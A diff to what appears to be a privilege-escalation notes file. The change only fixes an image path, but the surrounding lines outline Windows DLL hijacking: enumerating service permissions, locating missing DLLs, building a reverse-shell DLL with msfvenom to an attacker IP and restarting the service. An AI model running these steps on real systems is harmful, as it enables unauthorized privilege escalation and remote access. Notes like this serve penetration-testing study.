@@ -27,7 +27,7 @@
 2. Enumerate which of these services our user has stop and start access to `.\accesschk.exe /accepteula -uvqc user <service>`
 3. Once it's found wich service is vulnerable to dll hijacking, find the executable's path with `sc qc dllsvc`
 4. Using Process Monitor, add these the filters to find missing dlls.
-   <img src="img/procmon-config-add.png" alt="procmon-config">
+   <img src="../img/procmon-config-add.png" alt="procmon-config">
 5. Generate a reverse shell DLL named hijackme.dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll`
 6. Run again the vulnerable service: `net stop <service>` and `net start dllsvc`
 
